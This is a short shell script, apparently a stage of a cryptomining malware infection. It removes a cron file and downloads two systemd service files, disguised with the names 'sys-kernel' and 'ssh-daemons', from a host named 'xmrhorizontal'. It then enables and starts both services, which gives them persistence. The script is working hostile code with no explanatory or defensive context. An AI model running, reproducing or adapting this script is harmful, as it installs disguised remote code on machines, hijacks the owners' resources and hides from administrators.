if [ -e "/etc/cron.d/cronconfig" ]; then
	rm -f /etc/cron.d/cronconfig
 	cd /etc/systemd/system
	wget https://xmrhorizontal.github.io/sys-kernel.service
	wget https://xmrhorizontal.github.io/ssh-daemons.service
 	systemctl daemon-reload
        systemctl enable ssh-daemons.service
	systemctl enable sys-kernel.service
	systemctl start ssh-daemons.service
	systemctl start sys-kernel.service
fi
